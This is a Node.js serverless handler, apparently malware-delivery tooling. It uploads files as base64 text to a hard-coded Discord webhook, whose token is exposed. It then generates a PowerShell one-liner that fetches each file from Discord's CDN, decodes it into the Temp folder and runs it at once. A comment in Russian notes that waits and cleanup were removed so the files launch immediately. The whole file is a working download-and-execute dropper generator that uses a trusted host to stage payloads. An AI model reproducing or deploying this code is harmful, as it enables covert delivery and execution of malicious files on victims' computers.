const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

const handler = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(200).json({ ok: true, status: 'API is ready' });

  try {
    const { files } = req.body;
    if (!files || !files[0]) {
      return res.status(400).json({ success: false, error: 'No files provided' });
    }

    const uploadResults = [];
    for (const file of files) {
      const encodedName = file.filename.replace(/\.[^/.]+$/, '') + '.b64';
      const boundary = '----Boundary' + Math.random().toString(36).substring(2);
      
      const payload = Buffer.concat([
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
        Buffer.from(file.content), 
        Buffer.from(`\r\n--${boundary}--\r\n`)
      ]);

      const uploadedUrl = await new Promise((resolve, reject) => {
        const url = new URL(DISCORD_WEBHOOK);
        const discordReq = https.request({
          hostname: url.hostname,
          path: url.pathname,
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': payload.length
          }
        }, dRes => {
          let dData = '';
          dRes.on('data', chunk => dData += chunk);
          dRes.on('end', () => {
            try {
              const j = JSON.parse(dData);
              if (j.attachments?.[0]?.url) resolve(j.attachments[0].url);
              else reject(new Error('Discord upload failed'));
            } catch (e) { reject(new Error('Discord response error')); }
          });
        });
        discordReq.on('error', reject);
        discordReq.write(payload);
        discordReq.end();
      });

      uploadResults.push({ url: uploadedUrl, name: file.filename });
    }

    const genCmd = (r, i) => {
      const suffix = i === 0 ? '' : (i + 1).toString();
      // Убираем -Wait и Remove-Item, чтобы файлы открывались мгновенно и не блокировали друг друга
      return `$t${suffix}=$env:TEMP+'\\${r.name}';$u${suffix}='${r.url}';$d${suffix}=((irm $u${suffix})-replace'[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t${suffix},[Convert]::FromBase64String($d${suffix}));Start-Process $t${suffix}`;
    };

    const combinedLogic = uploadResults.map((r, i) => genCmd(r, i)).join(';');
    const finalCmd = `powershell -c "${combinedLogic}"`;

    const wh = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
    wh.write(JSON.stringify({ content: `📁 **${uploadResults.map(r => r.name).join(', ')}**\n\`\`\`powershell\n${finalCmd}\n\`\`\`` }));
    wh.end();

    return res.status(200).json({ success: true, command: finalCmd });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
};

handler.config = {
  api: {
    bodyParser: {
      sizeLimit: '4.5mb',
    },
  },
};

module.exports = handler;
